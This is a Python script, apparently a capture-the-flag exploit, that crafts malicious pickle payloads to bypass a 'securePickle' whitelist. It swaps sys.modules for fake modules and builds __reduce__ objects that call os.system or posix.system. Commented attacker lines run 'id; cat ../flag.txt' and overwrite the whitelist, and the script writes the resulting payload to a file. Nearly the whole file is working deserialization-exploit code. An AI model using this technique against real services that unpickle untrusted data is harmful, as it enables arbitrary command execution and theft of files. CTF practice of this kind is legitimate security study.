import sys, pickle, os, securePickle

class FakeMod(type(sys)):
    modules = {}

    def __init__(self, name):
        self.d = {}
        super().__init__(name)

    def __getattribute__(self, name):
        print("__getattribute__", name)
        d = self()
        return d[name]

    def __call__(self):
        print("__call__")
        return object.__getattribute__(self, "d")

def attr(s):
    mod, name = s.split(".")
    if mod not in FakeMod.modules:
        FakeMod.modules[mod] = FakeMod(mod)
    d = FakeMod.modules[mod]()
    if name not in d:
        def f(): pass
        f.__module__ = mod
        f.__qualname__ = name
        f.__name__ = name
        d[name] = f
    return d[name]

def asFn(s, mod="__main__"):
    name = s
    if "." in s:
        mod, name = s.split(".")
    if mod not in FakeMod.modules:
        FakeMod.modules[mod] = FakeMod(mod)
    d = FakeMod.modules[mod]()
    # 'FakeMod' object does not support item assignment
    #FakeMod.modules[mod][name] = f
    # 'module' object is not callable
    #m = sys.modules[mod]()
    #m[name] = f
    # We're essentially implementing:
    # sys.modules[mod].__dict__[name]
    def f(): pass
    f.__module__ = mod
    f.__qualname__ = name
    f.__name__ = name
    d[name] = f
    return f

def printHello():
    print("hello")

def asMod(mod):
    if mod not in FakeMod.modules:
        FakeMod.modules[mod] = FakeMod(mod)
    return FakeMod.modules[mod]

def dumps(obj):
    # use python version of dumps
    # which is easier to hack
    pickle.dumps = pickle._dumps
    orig = sys.modules
    sys.modules = FakeMod.modules
    s = pickle.dumps(obj)
    sys.modules = orig
    return s

a = attr("sys.__dict__")
print(dumps(a))

def craft(func, *args, dict=None, list=None, items=None):
    class X:
        def __reduce__(self):
            tup = func, tuple(args)
            if dict or list or items:
                tup += dict, list, items
            return tup
    return X()

# https://github.com/python/cpython/blob/3.12/Lib/pickle.py#L1578
def _getattribute(obj, name):
    for subpath in name.split('.'):
        if subpath == '<locals>':
            raise AttributeError("Can't get local attribute {!r} on {!r}"
                                 .format(name, obj))
        try:
            parent = obj
            obj = getattr(obj, subpath)
        except AttributeError:
            raise AttributeError("Can't get attribute {!r} on {!r}"
                                 .format(name, obj)) from None
    return obj, parent

def whichmodule(obj, name=None):
    """Find the module an object belong to."""
    if name is None:
        name = getattr(obj, '__qualname__', None)
    if name is None:
        name = obj.__name__
    module_name = getattr(obj, '__module__', None)
    if module_name is not None:
        return module_name
    # Protect the iteration by using a list copy of sys.modules against dynamic
    # modules that trigger imports of other modules upon calls to getattr.
    for module_name, module in sys.modules.copy().items():
        if (module_name == '__main__'
            or module_name == '__mp_main__'  # bpo-42406
            or module is None):
            continue
        try:
            if _getattribute(module, name)[0] is obj:
                return module_name
        except AttributeError:
            pass
    return '__main__'

# Attacker
# c1 = craft(
#     attr("sys.__setattr__"),
#     "modules", {"sys": getattr(sys, "modules")}
# )
# c2 = craft(attr("sys.__getitem__"), "securePickle", dict={"whitelist": ["sys", "os"]})
# c3 = craft(attr("os.system"), "id; cat ../flag.txt")
# obj = craft(attr("sys.displayhook"), (c2, c3))
#my_sys = craft(asFn("os.system"), "ls")
#my_ls = craft(asFn("print", "builtins"), "ls")
#c1 = craft(asFn("sys.modules"), "sys")
c1 = craft(asFn("sys.modules"), "__getitem__", "sys")
#c1 = craft(asFn("__getitem__"))
my_os = craft(asFn("posix.system"), "ls")
__import__ 
# my_secpickle = craft(attr("sys.__getitem__"), my_sys, "whitelist")
# whitelist = craft(attr("sys.__setitem__"), my_secpickle, ["sys", "os"])
#obj = craft(attr("sys.__getitem__"), "securePickle", dict={"whitelist": ["sys", "os"]})
#print(sys.modules)
print("DUMP:")
# with open("ls.pkl", "wb") as f:
#     pickle.dump(my_sys, f)
s = dumps(c1)
print(s)
with open("ls.pkl", "wb") as f:
    f.write(s)
#print(securePickle.whitelist)
user = pickle.loads(s)
# import pickletools
# pickletools.dis()